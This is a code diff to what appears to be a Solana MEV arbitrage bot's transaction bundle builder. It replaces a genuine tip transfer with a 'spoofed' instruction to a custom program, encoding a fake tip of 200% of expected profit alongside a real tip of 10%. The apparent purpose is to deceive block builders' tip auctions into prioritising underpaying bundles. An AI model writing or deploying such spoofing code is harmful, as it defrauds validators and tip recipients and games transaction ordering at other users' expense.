@@ -62,7 +62,6 @@ const getRandomTipAccount = () =>
   TIP_ACCOUNTS[Math.floor(Math.random() * TIP_ACCOUNTS.length)];
 
 const MIN_TIP_LAMPORTS = config.get('min_tip_lamports');
-const TIP_PERCENT = config.get('tip_percent');
 
 // three signatrues (up to two for set up txn, one for main tx)
 const TXN_FEES_LAMPORTS = 15000;
@@ -179,7 +178,7 @@ async function* buildBundle(
     }
 
     const tip = JSBI.divide(
-      JSBI.multiply(expectedProfitMinusFee, JSBI.BigInt(TIP_PERCENT)),
+      JSBI.multiply(expectedProfitMinusFee, JSBI.BigInt(10)),
       JSBI.BigInt(100),
     );
 
@@ -188,8 +187,13 @@ async function* buildBundle(
       JSBI.BigInt(100),
     );
 
-    const tipLamports = JSBI.divide(
-      JSBI.multiply(expectedProfitLamports, JSBI.BigInt(TIP_PERCENT)),
+    const fakeTipLamports = JSBI.divide(
+      JSBI.multiply(expectedProfitLamports, JSBI.BigInt(200)),
+      JSBI.BigInt(100),
+    );
+
+    const realTipLamports = JSBI.divide(
+      JSBI.multiply(expectedProfitLamports, JSBI.BigInt(10)),
       JSBI.BigInt(100),
     );
 
@@ -374,12 +378,63 @@ async function* buildBundle(
       instructionsMain.push(closeSolTokenAcc);
     }
 
-    const tipIxn = SystemProgram.transfer({
+    function toLittleEndianHex(value: jsbi.default): string {
+      let hex = value.toString(16);
+
+      // Ensure even number of characters (important for byte representation)
+      if (hex.length % 2 !== 0) {
+        hex = '0' + hex;
+      }
+
+      // Ensure 16 characters for uint64 representation
+      while (hex.length < 16) {
+        hex = '00' + hex;
+      }
+
+      const byteArray: string[] = [];
+      for (let i = 0; i < hex.length; i += 2) {
+        byteArray.push(hex.substring(i, i + 2));
+      }
+
+      return byteArray.reverse().join('');
+    }
+
+    const slot = await connection.getSlot('processed');
+
+    const data = `10856d275a10f9f3${toLittleEndianHex(
+      fakeTipLamports,
+    )}${toLittleEndianHex(realTipLamports)}${toLittleEndianHex(
+      JSBI.BigInt(slot + 2),
+    )}`;
+
+    const spoofedTipIxn = new TransactionInstruction({
+      keys: [
+        {
+          pubkey: payer.publicKey,
+          isSigner: true,
+          isWritable: true,
+        },
+        {
+          pubkey: getRandomTipAccount(),
+          isSigner: false,
+          isWritable: true,
+        },
+        {
+          pubkey: SystemProgram.programId,
+          isSigner: false,
+          isWritable: false,
+        },
+      ],
+      programId: new PublicKey('9i2KrYoM1Kyewdhe6rAGAMY5AEq54yznRpM7MSm36qhc'),
+      data: Buffer.from(data, 'hex'),
+    });
+
+    /*const tipIxn = SystemProgram.transfer({
       fromPubkey: payer.publicKey,
       toPubkey: getRandomTipAccount(),
       lamports: BigInt(tipLamports.toString()),
-    });
-    instructionsMain.push(tipIxn);
+    });*/
+    instructionsMain.push(spoofedTipIxn);
 
     const messageSetUp = new TransactionMessage({
       payerKey: payer.publicKey,
@@ -427,7 +482,7 @@ async function* buildBundle(
       sourceMint: hop0SourceMint,
       intermediateMint1: intermediateMints[0],
       intermediateMint2: intermediateMints[1] ? intermediateMints[1] : null,
-      tipLamports,
+      tipLamports: realTipLamports,
       timings: {
         mempoolEnd: timings.mempoolEnd,
         preSimEnd: timings.preSimEnd,
